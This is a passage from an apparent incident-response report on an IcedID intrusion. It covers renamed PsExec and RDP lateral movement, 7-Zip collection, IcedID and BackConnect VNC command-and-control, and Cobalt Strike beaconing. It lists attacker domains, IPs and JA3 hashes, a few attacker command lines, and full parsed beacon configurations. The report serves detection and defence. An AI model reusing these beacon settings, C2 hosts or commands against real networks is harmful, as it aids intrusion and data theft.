<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18587" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-035.png" alt width="1600" height="125" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-035.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-035-300x23.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-035-1024x80.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-035-768x60.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-035-1536x120.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18588" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-036.png" alt width="3145" height="1247" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-036.png 3145w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-036-300x119.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-036-1024x406.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-036-768x305.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-036-1536x609.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-036-2048x812.png 2048w" sizes="(max-width: 3145px) 100vw, 3145px" /></a></p>
<p>Overview of the mstdc.exe binary (renamed psexecsvc.exe):</p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18589" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-037.png" alt width="965" height="501" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-037.png 965w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-037-300x156.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-037-768x399.png 768w" sizes="(max-width: 965px) 100vw, 965px" /></a></p>
<p>Renaming PsExec is likely an action taken by threat actors to bypass basic PsExec anomaly rules. However, there are Sigma rules which detect this specific technique, as <a href="https://twitter.com/cyb3rops/status/1130747925242482688" target="_blank" rel="noreferrer noopener">shared</a> by Florian Roth back in 2019.</p>
<p>They also employed use of the Windows copy utility to move files around the network via SMB:</p>
<pre class="wp-block-preformatted">cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp\
</pre>
<h3 class="wp-block-heading">T1021.001 Remote Services: RDP</h3>
<p>Threat actors also used RDP during this intrusion. Below is an example of forensic artifacts left after using RDP to move laterally from the beachhead to one of the domain servers logged in Windows Event Logs using different providers:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18590" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-038.png" alt width="1273" height="380" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-038.png 1273w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-038-300x90.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-038-1024x306.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-038-768x229.png 768w" sizes="(max-width: 1273px) 100vw, 1273px" /></a></figure>
<p>&nbsp;</p>
<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>
<p>During discovery actions, the threat actors were observed using 7-Zip to archive data collected from active directory using AdFind.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18591" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-039.png" alt width="800" height="462" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-039.png 800w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-039-300x173.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-039-768x444.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></a></p>
<pre class="wp-block-preformatted">7.exe a -mx3 ad.7z ad_*
</pre>
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<h3 class="wp-block-heading">IcedID</h3>
<p>In this case IcedID was observed with the campaign ID of <code>3298576311</code> communicating with a C2 server located at kicknocisd[.]com.</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>Suricata Rule Name</strong></td>
<td><strong>Domain</strong></td>
<td><strong>IP</strong></td>
<td><strong>AS ORG</strong></td>
<td><strong>Country</strong></td>
</tr>
<tr>
<td>ET MALWARE Win32/IcedID Request Cookie</td>
<td>kicknocisd[.]com</td>
<td>159.65.169[.]200</td>
<td>DIGITALOCEAN-ASN</td>
<td>United States</td>
</tr>
</tbody>
</table>
</figure>
<p>After initial connections, IcedID command and control traffic moved to the following servers.</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Domain</td>
<td>IP</td>
<td>Port</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>curabiebarristie[.]com</td>
<td>198.244.180.66</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
<tr>
<td>stayersa[.]art</td>
<td>198.244.180.66</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
<tr>
<td>guaracheza[.]pics</td>
<td>45.66.248.119</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
<tr>
<td>belliecow[.]wiki</td>
<td>45.66.248.119</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
</tbody>
</table>
</figure>
<p>Connections to one of the IcedID servers was observed in memory dumps from the beachhead host. This evidence is consistent with the connections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning of this case.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18592" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-040.png" alt width="1390" height="109" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-040.png 1390w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-040-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-040-1024x80.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-040-768x60.png 768w" sizes="(max-width: 1390px) 100vw, 1390px" /></a></p>
<h3 class="wp-block-heading">BackConnect VNC</h3>
<p>During the intrusion we also observed connections to a BackConnect VNC IP address. These connections were also spawned from the running IcedID process on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18593" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-041.png" alt width="1389" height="152" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-041.png 1389w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-041-300x33.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-041-1024x112.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-041-768x84.png 768w" sizes="(max-width: 1389px) 100vw, 1389px" /></a></p>
<p>Alerts from <a href="https://twitter.com/NetcowboyDK" target="_blank" rel="noopener">Lenny Hansson</a>&#8216;s <a href="https://networkforensic.dk/SNORT/default.html" target="_blank" rel="noopener">ruleset</a> fired on the traffic for the following alerts:</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Suricata Alert</td>
<td>IP</td>
<td>Port</td>
</tr>
<tr>
<td>NF &#8211; Malware IcedID BackConnect &#8211; Wait Command</td>
<td>137.74.104.108</td>
<td>8080</td>
</tr>
<tr>
<td>NF &#8211; Malware IcedID BackConnect &#8211; Start VNC command &#8211; 11</td>
<td>137.74.104.108</td>
<td>8080</td>
</tr>
</tbody>
</table>
</figure>
<p>Here&#8217;s another look at the VNC GUI from the attackers standpoint.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18621" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-058.png" alt width="1199" height="410" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-058.png 1199w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-058-300x103.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-058-1024x350.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-058-768x263.png 768w" sizes="(max-width: 1199px) 100vw, 1199px" /></a>In the <a href="#execution">execution section</a> we covered utilities launched by the threat actors from the VNC activity.</p>
<h3 class="wp-block-heading">Web Service</h3>
<p>On the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and connected to the site dropmefiles[.]com a site that offers free file transfer services. Data connections from the Edge browser in the SRUMDB indicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18594" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-042.png" alt width="1031" height="734" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-042.png 1031w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-042-300x214.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-042-1024x729.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-042-768x547.png 768w" sizes="(max-width: 1031px) 100vw, 1031px" /></a></p>
<h3 class="wp-block-heading">Cobalt Strike</h3>
<h4 class="wp-block-heading">T1071 / S0154</h4>
<p>The threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead. This malicious DLL is a Cobalt Strike beacon reaching out to 23.29.115.152/aicsoftware[.]com on ports 757 and 8080. Later the threat actors also injected further beacons into memory reaching out to 50.3.132.232 /iconnectgs[.]com on port 8081. Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242 on port 443 (see below for visualizing this activity).</p>
<h3 class="wp-block-heading">Beaconing</h3>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18595" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-043.png" alt width="2483" height="552" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-043.png 2483w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-043-300x67.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-043-1024x228.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-043-768x171.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-043-1536x341.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-043-2048x455.png 2048w" sizes="(max-width: 2483px) 100vw, 2483px" /></a></p>
<p>Below is a screenshot of a packet captured from C2 traffic over HTTP. Encrypted POST requests made to iconnectgs[.]com (50.3.132[.]232) are seen:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18596" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-044.png" alt width="1600" height="414" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-044.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-044-300x78.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-044-1024x265.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-044-768x199.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-044-1536x397.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<h3 class="wp-block-heading">Cobalt Strike Configurations</h3>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Domain</td>
<td>IP</td>
<td>Port</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>aicsoftware[.]com</td>
<td>23.29.115.152</td>
<td>757</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
</tr>
<tr>
<td>aicsoftware[.]com</td>
<td>23.29.115.152</td>
<td>8080</td>
<td>N/A</td>
<td>N/A</td>
</tr>
</tbody>
</table>
</figure>
<pre class="wp-block-preformatted">{
    "beacontype": [
        "HTTP"
    ],
    "sleeptime": 62518,
    "jitter": 37,
    "maxgetsize": 1398708,
    "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
    "license_id": 305419776,
    "cfg_caution": false,
    "kill_date": null,
    "server": {
        "hostname": "aicsoftware.com",
        "port": 8080,
        "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTgLGIvbpnfCb/itwv1b3pfVlfzKp7OJvlLCx21brRU3EF8QXjMD8Dsp5t0wZjZ8WRRiSfkU5KoY2ARexF3Jbd3W4O243q1gdj3t6aphyIIcgEX3MUWC71J7gZH+DIMf/LdVZFh76Oz1bPk4lz8s723kIunh59yajMHMUgrsM3HQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    },
    "host_header": "",
    "useragent_header": null,
    "http-get": {
        "uri": "/br.js",
        "verb": "GET",
        "client": {
            "headers": null,
            "metadata": null
        },
        "server": {
            "output": [
                "print",
                "prepend 600 characters",
                "base64",
                "mask"
            ]
        }
    },
    "http-post": {
        "uri": "/es",
        "verb": "POST",
        "client": {
            "headers": null,
            "id": null,
            "output": null
        }
    },
    "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "crypto_scheme": 0,
    "proxy": {
        "type": null,
        "username": null,
        "password": null,
        "behavior": "Use IE settings"
    },
    "http_post_chunk": 0,
    "uses_cookies": true,
    "post-ex": {
        "spawnto_x86": "%windir%\\syswow64\\regsvr32.exe",
        "spawnto_x64": "%windir%\\sysnative\\regsvr32.exe"
    },
    "process-inject": {
        "allocator": "VirtualAllocEx",
        "execute": [
            "CreateThread",
            "RtlCreateUserThread",
            "CreateRemoteThread"
        ],
        "min_alloc": 6133,
        "startrwx": false,
        "stub": "tUr+Aexqde3zXhpE+L05KQ==",
        "transform-x86": [
            "prepend '\\x90\\x90\\x90\\x90\\x90\\x90'"
        ],
        "transform-x64": [
            "prepend '\\x90\\x90\\x90\\x90\\x90\\x90'"
        ],
        "userwx": false
    },
    "dns-beacon": {
        "dns_idle": null,
        "dns_sleep": null,
        "maxdns": null,
        "beacon": null,
        "get_A": null,
        "get_AAAA": null,
        "get_TXT": null,
        "put_metadata": null,
        "put_output": null
    },
    "pipename": null,
    "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "stage": {
        "cleanup": true
    },
    "ssh": {
        "hostname": null,
        "port": null,
        "username": null,
        "password": null,
        "privatekey": null
    }
}
</pre>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Domain</td>
<td>IP</td>
<td>Port</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>iconnectgs[.]com</td>
<td>50.3.132.232</td>
<td>8081</td>
<td>N/A</td>
<td>N/A</td>
</tr>
</tbody>
</table>
</figure>
<pre class="wp-block-preformatted">[{
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
  "pipename": null,
  "dns_beacon": {
    "put_metadata": null,
    "get_TXT": null,
    "get_AAAA": null,
    "get_A": null,
    "beacon": null,
    "maxdns": null,
    "dns_sleep": null,
    "put_output": null,
    "dns_idle": null
  },
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "post_ex": {
    "spawnto_x64": "%windir%\\sysnative\\svchost.exe",
    "spawnto_x86": "%windir%\\syswow64\\svchost.exe"
  },
  "stage": {
    "cleanup": "true"
  },
  "process_inject": {
    "stub": "snNvHLupDUIob8Qr+6dPTQ\u003d\u003d",
    "transform_x64": ["prepend \u0027\\x90\\x90\\x90\\x90\u0027"],
    "transform_x86": ["prepend \u0027\\x90\\x90\\x90\\x90\u0027"],
    "startrwx": "false",
    "min_alloc": "5271",
    "userwx": "false",
    "execute": ["CreateThread", "RtlCreateUserThread", "CreateRemoteThread"],
    "allocator": "VirtualAllocEx"
  },
  "uses_cookies": "true",
  "http_post_chunk": "0",
  "ssh": {
    "privatekey": null,
    "username": null,
    "password": null,
    "port": null,
    "hostname": null
  },
  "useragent_header": null,
  "maxgetsize": "1864478",
  "proxy": {
    "behavior": "Use IE settings",
    "password": null,
    "username": null,
    "type": null
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "server": {
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrr8AvQMH9nOuqc7x6r58gsuNMYuuRdKcMgo3iPMjQgM1u5BNXqKJBnOPlz6j+wbv+L9/BM6+oKDxxXEzsEMHxGaD49lXoKoA5RVtEgh9CnVFKN2bcqIZsbc64l+Ty7DXkUI1eHmTo4Lz8vXy4098Q4ll8YZOn8+8jnqU2QV4OWwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
    "port": "8081",
    "hostname": "iconnectgs.com"
  },
  "beacontype": ["HTTP"],
  "kill_date": null,
  "license_id": "0",
  "jitter": "43",
  "sleeptime": "62004",
  "http_get": {
    "server": {
      "output": ["print", "prepend 338 characters", "base64", "base64"]
    },
    "client": {
      "metadata": [],
      "headers": []
    },
    "verb": "GET",
    "uri": "/hr"
  },
  "cfg_caution": "false",
  "host_header": "",
  "crypto_scheme": "0",
  "http_post": {
    "client": {
      "output": [],
      "id": [],
      "headers": []
    },
    "verb": "POST",
    "uri": "/mobile-home"
  }
}, {
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
  "pipename": null,
  "dns_beacon": {
    "put_metadata": null,
    "get_TXT": null,
    "get_AAAA": null,
    "get_A": null,
    "beacon": null,
    "maxdns": null,
    "dns_sleep": null,
    "put_output": null,
    "dns_idle": null
  },
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "post_ex": {
    "spawnto_x64": "%windir%\\sysnative\\svchost.exe",
    "spawnto_x86": "%windir%\\syswow64\\svchost.exe"
  },
  "stage": {
    "cleanup": "true"
  },
  "process_inject": {
    "stub": "snNvHLupDUIob8Qr+6dPTQ\u003d\u003d",
    "transform_x64": ["prepend \u0027\\x90\\x90\\x90\\x90\u0027"],
    "transform_x86": ["prepend \u0027\\x90\\x90\\x90\\x90\u0027"],
    "startrwx": "false",
    "min_alloc": "5271",
    "userwx": "false",
    "execute": ["CreateThread", "RtlCreateUserThread", "CreateRemoteThread"],
    "allocator": "VirtualAllocEx"
  },
  "uses_cookies": "true",
  "http_post_chunk": "0",
  "ssh": {
    "privatekey": null,
    "username": null,
    "password": null,
    "port": null,
    "hostname": null
  },
  "useragent_header": null,
  "maxgetsize": "1864478",
  "proxy": {
    "behavior": "Use IE settings",
    "password": null,
    "username": null,
    "type": null
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "server": {
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrr8AvQMH9nOuqc7x6r58gsuNMYuuRdKcMgo3iPMjQgM1u5BNXqKJBnOPlz6j+wbv+L9/BM6+oKDxxXEzsEMHxGaD49lXoKoA5RVtEgh9CnVFKN2bcqIZsbc64l+Ty7DXkUI1eHmTo4Lz8vXy4098Q4ll8YZOn8+8jnqU2QV4OWwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
    "port": "8081",
    "hostname": "iconnectgs.com"
  },
  "beacontype": ["HTTP"],
  "kill_date": null,
  "license_id": "0",
  "jitter": "43",
  "sleeptime": "62004",
  "http_get": {
    "server": {
      "output": ["print", "prepend 338 characters", "base64", "base64"]
    },
    "client": {
      "metadata": [],
      "headers": []
    },
    "verb": "GET",
    "uri": "/hr"
  },
  "cfg_caution": "false",
  "host_header": "",
  "crypto_scheme": "0",
  "http_post": {
    "client": {
      "output": [],
      "id": [],
      "headers": []
    },
    "verb": "POST",
    "uri": "/mobile-home"
  }
}]
</pre>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Domain</td>
<td>IP</td>
<td>Port</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>N/A</td>
<td>5.8.18.242</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
</tr>
</tbody>
</table>
</figure>
<pre class="wp-block-preformatted">[{
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
  "pipename": null,
  "dns_beacon": {
    "put_metadata": null,
    "get_TXT": null,
    "get_AAAA": null,
    "get_A": null,
    "beacon": null,
    "maxdns": null,
    "dns_sleep": null,
    "put_output": null,
    "dns_idle": null
  },
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "post_ex": {
    "spawnto_x64": "%windir%\\sysnative\\rundll32.exe",
    "spawnto_x86": "%windir%\\syswow64\\rundll32.exe"
  },
  "stage": {
    "cleanup": "false"
  },
  "process_inject": {
    "stub": "tUr+Aexqde3zXhpE+L05KQ\u003d\u003d",
    "transform_x64": [],
    "transform_x86": [],
    "startrwx": "true",
    "min_alloc": "0",
    "userwx": "true",
    "execute": ["CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread"],
    "allocator": "VirtualAllocEx"
  },
  "uses_cookies": "true",
  "http_post_chunk": "0",
  "ssh": {
    "privatekey": null,
    "username": null,
    "password": null,
    "port": null,
    "hostname": null
  },
  "useragent_header": null,
  "maxgetsize": "1048576",
  "proxy": {
    "behavior": "Use IE settings",
    "password": null,
    "username": null,
    "type": null
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "server": {
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
    "port": "80",
    "hostname": "5.8.18.242"
  },
  "beacontype": ["HTTP"],
  "kill_date": null,
  "license_id": "305419776",
  "jitter": "0",
  "sleeptime": "60000",
  "http_get": {
    "server": {
      "output": ["print"]
    },
    "client": {
      "metadata": [],
      "headers": []
    },
    "verb": "GET",
    "uri": "/pixel.gif"
  },
  "cfg_caution": "false",
  "host_header": "",
  "crypto_scheme": "0",
  "http_post": {
    "client": {
      "output": [],
      "id": [],
      "headers": []
    },
    "verb": "POST",
    "uri": "/submit.php"
  }
}, {
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
  "pipename": null,
  "dns_beacon": {
    "put_metadata": null,
    "get_TXT": null,
    "get_AAAA": null,
    "get_A": null,
    "beacon": null,
    "maxdns": null,
    "dns_sleep": null,
    "put_output": null,
    "dns_idle": null
  },
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "post_ex": {
    "spawnto_x64": "%windir%\\sysnative\\rundll32.exe",
    "spawnto_x86": "%windir%\\syswow64\\rundll32.exe"
  },
  "stage": {
    "cleanup": "false"
  },
  "process_inject": {
    "stub": "tUr+Aexqde3zXhpE+L05KQ\u003d\u003d",
    "transform_x64": [],
    "transform_x86": [],
    "startrwx": "true",
    "min_alloc": "0",
    "userwx": "true",
    "execute": ["CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread"],
    "allocator": "VirtualAllocEx"
  },
  "uses_cookies": "true",
  "http_post_chunk": "0",
  "ssh": {
    "privatekey": null,
    "username": null,
    "password": null,
    "port": null,
    "hostname": null
  },
  "useragent_header": null,
  "maxgetsize": "1048576",
  "proxy": {
    "behavior": "Use IE settings",
    "password": null,
    "username": null,
    "type": null
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d",
  "server": {
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003d\u003d",
    "port": "443",
    "hostname": "5.8.18.242"
  },
  "beacontype": ["HTTPS"],
  "kill_date": null,
  "license_id": "305419776",
  "jitter": "0",
  "sleeptime": "60000",
  "http_get": {
    "server": {
      "output": ["print"]
    },
    "client": {
      "metadata": [],
      "headers": []
    },
    "verb": "GET",
    "uri": "/dot.gif"
  },
  "cfg_caution": "false",
  "host_header": "",
  "crypto_scheme": "0",
  "http_post": {
    "client": {
      "output": [],
      "id": [],
      "headers": []
    },
    "verb": "POST",
    "uri": "/submit.php"
  }
}]
</pre>
<h2 id="exfiltration" class="wp-block-heading"><a href="#exfiltration">Exfiltration</a></h2>
<p>During the intrusion, the threat actors targeted password documents on network shares. We observed these being taken and opened off network through the use of canaries. No overt exfiltration was observed so we assess that this occurred over existing command and control channels.</p>
